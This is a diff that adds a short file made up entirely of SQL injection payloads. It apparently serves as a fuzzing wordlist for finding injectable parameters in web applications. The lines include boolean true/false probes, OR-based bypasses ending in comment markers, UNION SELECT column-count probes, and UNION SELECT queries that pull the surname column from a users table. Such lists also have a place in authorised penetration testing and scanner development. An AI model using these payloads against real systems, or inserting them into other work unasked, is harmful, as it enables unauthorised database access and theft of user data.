@@ -1,0 +1,31 @@
+" and "1"="1
+" and "1"="2
+" or "1"="2"--
+" union select 1--
+" union select 1,2--
+" union select 1,2,3--
+' and '1'='1
+' and '1'='2
+' or '1'='2'--
+ ' union select 1--
+ ' union select 1,2--
+ ' union select 1,2,3--
+ and 1=1#
+ and 1=2#
+ or 1=2#
+ union select 1#
+ union select 1,2#
+ union select 1,2,3#
+ " or "1"="1"--
+ " union select surname FROM users--
+ " union select surname,surname FROM users--
+
+ " union select surname,surname,surname FROM users--
+ ' or '1'='1'--
+ ' union select surname FROM users--
+ ' union select surname,surname FROM users--
+ ' union select surname,surname,surname FROM users--
+ or 1=1#
+ union select surname FROM users#
+ union select surname,surname FROM users#
+ union select surname,surname,surname FROM users#
